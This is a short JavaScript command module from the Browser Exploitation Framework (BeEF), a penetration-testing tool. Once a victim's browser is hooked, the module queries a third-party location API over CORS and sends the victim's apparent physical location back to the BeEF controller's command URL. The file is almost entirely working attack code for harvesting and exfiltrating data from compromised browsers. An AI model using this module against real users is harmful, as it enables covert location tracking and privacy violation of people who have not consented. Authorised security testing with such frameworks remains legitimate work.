//
// Copyright (c) 2006-2023Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function() {
  var url = "<%= @api_url %>";
  var timeout = 10000;

  if (!beef.browser.hasCors()) {
    beef.net.send('<%= @command_url %>', <%= @command_id %>, 'fail=Browser does not support CORS', beef.are.status_error());
    return;
  }

  beef.net.cors.request('GET', url, '', timeout, function(response) {
    beef.debug("[Get Physical Location (Third-Party] " + response.body);
    beef.net.send("<%= @command_url %>", <%= @command_id %>, "result=" + response.body, beef.are.status_success());
  });
});
